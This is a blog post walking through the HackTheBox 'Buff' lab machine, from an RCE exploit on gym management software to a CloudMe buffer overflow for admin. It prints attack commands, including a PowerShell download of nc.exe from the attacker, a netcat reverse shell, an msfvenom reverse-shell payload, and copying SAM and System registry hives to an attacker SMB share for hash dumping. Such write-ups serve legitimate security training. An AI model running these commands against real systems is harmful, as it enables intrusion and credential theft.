<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.5.1"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="HackTheBox - Buff" /><meta property="og:locale" content="en_US" /><meta name="description" content="Welcome to my blog of CTF walkthroughs and anything else I post regarding cyber security." /><meta property="og:description" content="Welcome to my blog of CTF walkthroughs and anything else I post regarding cyber security." /><link rel="canonical" href="https://freddiphish.github.io/posts/HTB-Buff/" /><meta property="og:url" content="https://freddiphish.github.io/posts/HTB-Buff/" /><meta property="og:site_name" content="FreddiPhish" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-11-22T12:00:00+11:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox - Buff" /><meta name="twitter:site" content="@FreddiPhish" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"Welcome to my blog of CTF walkthroughs and anything else I post regarding cyber security.","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://freddiphish.github.io/posts/HTB-Buff/"},"url":"https://freddiphish.github.io/posts/HTB-Buff/","headline":"HackTheBox - Buff","dateModified":"2020-11-22T12:00:00+11:00","datePublished":"2020-11-22T12:00:00+11:00","@context":"https://schema.org"}</script><title>HackTheBox - Buff | FreddiPhish</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/favicons/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">FreddiPhish</a></div><div class="site-subtitle font-italic">Cybersecurity Blog</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/FreddiPhish" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/FreddiPhish" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HackTheBox - Buff</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackTheBox - Buff</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Nov 22, 2020, 12:00 PM +1100" > Nov 22, 2020 <i class="unloaded">2020-11-22T12:00:00+11:00</i> </span> by <span class="author"> </span></div><div> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Thu, Nov 26, 2020, 2:36 PM +1100" > Nov 26, 2020 <i class="unloaded">2020-11-26T14:36:53+11:00</i> </span></div></div><div class="post-content"><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/images/htb/buff/info-card.png" alt="Image of info card" /></p><h2 id="enumeration">Enumeration</h2><hr /><h3 id="initial-information">Initial Information</h3><p>Before starting we are shown this this is a windows box and that they rate it as an easy box.</p><h3 id="editing-hosts">Editing Hosts</h3><p>Lets add assign the ip address a domain name in our hosts file.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>sudo vim /etc/hosts
[ip] buff.htb
</pre></table></code></div></div><h3 id="nmap-scan">Nmap Scan:</h3><p>Lets run <a href="https://nmap.org/">nmap</a> to find information on the machine’s ports and services.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sudo nmap -A -T4 -Pn -oN nmap-scan -p$(sudo nmap -Pn -p- --min-rate=1000 -T4 buff.htb | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) buff.htb
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/images/htb/buff/nmap-scan.png" alt="Image of nmap scan" /></p><p>The results of nmap show that ports 5040 (unknown), 7680 (pando-pub?) and 8080 (http) are open.</p><h3 id="browsing">Browsing</h3><p>Looking at the website on port 8080 reveals a website about fitness, likely why the machine is called buff.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/images/htb/buff/browser-home.png" alt="Image of website homepage" /></p><p>Whilst browsing around the site we find some a software version on the Contact page, which states <code class="language-plaintext highlighter-rouge">Made using Gym Management Software 1.0</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/images/htb/buff/browser-contact.png" alt="Image of website homepage" /></p><h2 id="exploitation">Exploitation</h2><hr /><p>Doing a seachsploit for Gym Managent Software 1.0 reveals that there are exploits for it in exploitdb.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/images/htb/buff/searchsploit-gym.png" alt="Image of gym searchsploit" /></p><p>We find Gym Management System 1.0 - Unauthenticated Remote Code Execution under php/webapps/48506.py</p><p>The version matches and looking at the exploit code, it looks like the only argument required is the url for the site.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python 48506.py http://buff.htb:8080/
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/images/htb/buff/shell-foothold.png" alt="Image of initial shell" /></p><p>We successfully get a webshell.</p><p>Although we can likely get the user.txt flag, we will first updrade to a proper netcat shell by uploading the netcat binary using powershell.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.14/nc.exe','C:\xampp\htdocs\gym\upload\nc.exe')
</pre></table></code></div></div><p>Now that netcat is on the system, we can start a listener on our kali machine:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nc -nlvp 4444
</pre></table></code></div></div><p>And connect to it from the windows machine</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nc 10.10.14.14 4444 -e cmd.exe
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/images/htb/buff/shell-nc.png" alt="Image of initial shell" /></p><p>We now have a netcat reverse shell!</p><p>Doing a <code class="language-plaintext highlighter-rouge">whoami</code> reveals that we are a user called shaun.</p><p>Normally the flag will be in the Desktop folder and sure enough navigating to C:\Users\shaun\Desktop reveals the user.txt file. Outputing the contents with <code class="language-plaintext highlighter-rouge">type user.txt</code> reveals the flag!</p><p>Now that we have the user flag it’s time to get root/admin.</p><h2 id="post-enumeration">Post Enumeration</h2><hr /><p>My normal post exploitation includes getting:</p><ul><li>host information<li>users &amp; groups<li>running processes<li>network<li>scheduled jobs<li>installed applications<li>searching directories</ul><p>However this time ill be starting off with the automated approach, running <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">winPEAS</a> on the system.</p><p>We will need to download the binary file and transfer it from our kali machine to Buff then run it. I often output it to a file then print out its contents.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>winPEASx64.exe &gt; winOut.txt
type winOut.txt
</pre></table></code></div></div><p>Looking through the output, the vulnerability suggester <code class="language-plaintext highlighter-rouge">watson</code> shows a few vulnerabilities that might be interesting.</p><p>Another find is a file caleld <code class="language-plaintext highlighter-rouge">CloudMe_1112.exe</code> located in the Downloads folder.</p><p>Doing a searchsploit for CloudMe shows a few vulnerabilties, with some buffer overflows for a version 1.11.2 which looks like it could match the exe file found in the Downloads folder.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/images/htb/buff/searchsploit-cloudme.png" alt="Image of initial shell" /></p><p>Looking at the exploit and searching for cloudme online, it looks like it runs on port 8888.</p><p>We didnt see anything running on that TCP port with nmap but can check if there’s something running on that port locally with netstat.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>netstat -ano | findstr 8888
</pre></table></code></div></div><p>We find that something is in fact using that port, and it’s likely CloudMe.</p><p>We can double check that CloudMe service is running using tasklist.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>tasklist /SVC
</pre></table></code></div></div><p>And towards the end we see <code class="language-plaintext highlighter-rouge">CloudMe.exe 3232 N/A</code></p><p>At this point while there’s more enumeration we can do, it’s looking like the intended path is to use the cloudme bufferoverflow exploit to gain admin so I’ll be going down that path.</p><h2 id="privilege-escalation">Privilege Escalation</h2><hr /><p>Based on the name of the CloudMe file, <code class="language-plaintext highlighter-rouge">Cloud_Me_1112.exe</code> and looking at versions of it online, it’s safe to assume that the version is 1.11.2.</p><p>From the searchsploit results form earlier, we know that there is an exploit that matches the version. Looking online at one of the matching exploits on <a href="https://www.exploit-db.com/exploits/48389">exploitdb</a> mentions that we need to ensure that the CloudMe service is running before running the script, which we already know it is.</p><p>Looking online for more information about the exploit reveals <a href="https://www.cvedetails.com/cve/CVE-2018-6892/">CVE-2018-6892</a> which is likely the CVE for the vulnerability, or a similar one that is being exploited. The description reads:</p><blockquote><p>An issue was discovered in CloudMe before 1.11.0. An unauthenticated remote attacker that can connect to the “CloudMe Sync” client application listening on port 8888 can send a malicious payload causing a buffer overflow condition. This will result in an attacker controlling the program’s execution flow and allowing arbitrary code execution.</p></blockquote><p>The exploit is written in python and it doesn’t appear that the windows machine is running python, so we can either try:</p><ul><li>converting it to an .exe file<li>using port forwarding.</ul><p>We’ll be going with the later, port forwarding. As for the software to use for port forwarding, the options that come to mind are chisel and plink and we will be using plink.</p><p>HackTheBox has said on discord on the 09/17/2020:</p><blockquote><p>From now on all outbound connections on port 22 from the target machines back to the user machines are blocked by our internal firewall rules. This applies to all labs of HTB. This decision has been made to prevent players from exposing themselves to security risks due to default credential use on their hosts. So from now on you have to configure your local Machines for ssh tunnelling etc via other port.</p></blockquote><p>So first we need to configure ssh on our kali machine.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>vim /etc/ssh/ssh_config
</pre></table></code></div></div><p>Uncomment the #Port 22 and change it to another port, we will be doing port 222.</p><p>Start the ssh service and double check that it’s running.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>service ssh start
service ssh status
</pre></table></code></div></div><p>We can now go back to the windows machine at foward port 8888 using plink.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>plink.exe -ssh -l freddi 10.10.14.156 -P 222 -R 8888:127.0.0.1:8888
</pre></table></code></div></div><p>Now on our kali machine, whenever we target our kali’s port 8888, it will redirect to port 8888 on the windows machine.</p><p>We can check its working with a quick nmap scan.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap -sS -sV -p8888 127.0.0.1 
</pre></table></code></div></div><p>It shows the ports open and is tunnelled.</p><p>Now that we can access the port, time to get back to the exploit.</p><p>Looking at the proof of concept, it looks like we just need to change the payload.</p><p>Time to generate a payload with msfvenom.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.156 LPORT=4445 EXITFUNC=thread -b "\x00\x0d\x0a" -f python -v payload
</pre></table></code></div></div><p>The flags/arguments set are:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>-p for the payload
EXITFUNC=thread incase the bufferoverflow crashes the application
-b "\x00\x0d\x0a" represents characters to avoid that will cause the exploit to break
-v specifies a veriable name, in this case payload otherwise it will be left as the default buf.
</pre></table></code></div></div><p>Some considerations that we wont be doing for the payload are specifying the architecture and if we needed a smaller payload we can instead execute a funtion to use nc.exxe to connect back to us. We can run a command using the windows/exec payload.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>-p windows/exec CMD='C:\xampp\htdocs\gym\upload\nc.exe 10.10.14.14 4444 -e cmd.exe'
</pre></table></code></div></div><p>Now we can copy the generated payload over into python buffer overflow, replacing the default payload inside it.</p><p>Now we set up a netcat listener.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nc -nlvp 4444
</pre></table></code></div></div><p>Finally we can run the exploit, which should go to 127.0.0.1:8888 then be redirected to our windows port 8888. This took me a number of attepts to run but it eventually worked.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/images/htb/buff/shell-admin.png" alt="Image of shell as admin" /></p><p>The result is that we get a shell as admin.</p><p>Looking in C:\Users\Administrator\Desktop reveals the root.txt flag!</p><p>Although we are done, as a little post enum I like to get the password hashes of the machine.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>reg save HKLM\SAM c:\SAM
reg save HKLM\System c:\System
</pre></table></code></div></div><p>Let’s set up a smb server using impackets toolkit.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sudo impacket-smbserver -smb2support TEMP $(pwd)
</pre></table></code></div></div><p>Copy the files from the target back to our local machine.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>copy SAM \\10.10.14.14\TEMP\
copy System\\10.10.14.14\TEMP\
</pre></table></code></div></div><p>Now on kali we can output the hashes using samdump2.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>samdump2 System SAM
</pre></table></code></div></div><p>And we get the hashes!</p><h2 id="problems-encountered">Problems Encountered</h2><hr /><p>First was the ssh outbound port being blocked. I was lucky in that I remembered seeing an announcement a while back regarding ssh and went back to look.</p><p>Second was using plink.exe ssh algorithms key which was I solved by adding in keys at the end in the /etc/ssh/ssh_config</p><p>As referenced here:</p><ul><li><a href="https://www.ssh.com/ssh/sshd_config/">https://www.ssh.com/ssh/sshd_config/</a><li><a href="https://gravitational.com/blog/ssh-config/">https://gravitational.com/blog/ssh-config/</a></ul><p>Lastly was the exploit which only worked on the second try after I added the execfunc=thread into the payload. Before then I tried a variety of different payloads that seem like they should have worked and launched them multiple times.</p><p>Also when it came to tranfering files, smb2 is required so I used impacket-smbserver with the smb2 flag.</p><h2 id="conclusion">Conclusion</h2><hr /><p>Overall I enjoyed this box. The user flag seemed really straight foward to get as it normally is for easy boxes which can give some motivation and the root flag helped learn more about port fowarding and a reminder that sometimes you need to launch exploits more than once to get it to work.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/htb/'>HTB</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/port-fowarding/" class="post-tag no-text-decoration" >port fowarding</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox - Buff - FreddiPhish&url=https://freddiphish.github.io/posts/HTB-Buff/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox - Buff - FreddiPhish&u=https://freddiphish.github.io/posts/HTB-Buff/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HackTheBox - Buff - FreddiPhish&url=https://freddiphish.github.io/posts/HTB-Buff/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HTB-Omni/">HackTheBox - Omni</a><li><a href="/posts/HTB-Buff/">HackTheBox - Buff</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/openbsd/">openbsd</a> <a class="post-tag" href="/tags/port-fowarding/">port fowarding</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/windows-iot/">windows iot</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTB-OpenKeyS/"><div class="card-body"> <span class="timeago small" > Dec 13, 2020 <i class="unloaded">2020-12-13T12:00:00+11:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - OpenKeyS</h3><div class="text-muted small"><p> Enumeration Initial Information Based on the information provided by HackTheBox, OpenKeys is rated as medium difficulty and is running OpenBSD for it’s Operating System. Editing hosts A domai...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-Omni/"><div class="card-body"> <span class="timeago small" > Jan 10 <i class="unloaded">2021-01-10T22:00:00+11:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Omni</h3><div class="text-muted small"><p> Enumeration Initial Information Based on the information provided by HackTheBox, Omni is rated as easy difficulty and is running an unknown Operating System. Editing hosts A domain name can b...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-Blunder/"><div class="card-body"> <span class="timeago small" > Nov 4, 2020 <i class="unloaded">2020-11-04T20:40:00+11:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Blunder</h3><div class="text-muted small"><p> Enumeration Initial Information Before starting we are shown this this is a linux box and that they rate it as an easy box. Editing Hosts Lets add assign the ip address a domain name in our h...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HTB-Tabby/" class="btn btn-outline-primary"><p>HackTheBox - Tabby</p></a> <a href="/posts/HTB-OpenKeyS/" class="btn btn-outline-primary"><p>HackTheBox - OpenKeyS</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/FreddiPhish">FreddiPhish</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" 